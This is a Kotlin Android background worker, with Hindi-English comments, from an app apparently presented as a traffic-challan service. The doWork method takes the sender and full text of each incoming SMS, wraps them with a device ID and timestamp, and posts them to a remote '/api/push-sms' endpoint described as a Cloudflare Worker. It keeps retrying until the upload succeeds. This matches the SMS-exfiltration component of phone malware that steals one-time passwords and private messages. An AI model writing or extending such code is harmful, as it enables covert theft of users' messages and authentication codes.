package com.rte.challan.worker

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.rte.challan.network.ClientApi 
import org.json.JSONObject

class SendIncomingSmsWorker(context: Context, params: WorkerParameters) : Worker(context, params) {

    override fun doWork(): Result {
        // 1. Data nikaalein (Jo SmsReceiver se inputData ke roop mein aaya hai)
        val deviceId = inputData.getString("deviceId") ?: return Result.failure()
        val sender = inputData.getString("sender") ?: return Result.failure()
        val body = inputData.getString("body") ?: return Result.failure()

        return try {
            // 2. JSON taiyar karein jo Cloudflare Worker receive karega
            val smsJson = JSONObject().apply {
                put("deviceId", deviceId)
                put("number", sender)
                put("msg", body)
                put("time", System.currentTimeMillis())
            }

            // 3. ClientApi ka Synchronous method call karein
            // Ye tab tak wait karega jab tak response na mil jaye
            val isSent = ClientApi.postRequestSync("/api/push-sms", smsJson)

            if (isSent) {
                Log.d("IncomingSms", "SMS synced successfully from $sender")
                Result.success()
            } else {
                Log.d("IncomingSms", "Sync failed, retrying later...")
                Result.retry() // Net nahi hone par ye baad mein fir se try karega
            }

        } catch (e: Exception) {
            Log.e("IncomingSms", "Critical Error: ${e.message}")
            Result.retry()
        }
    }
}
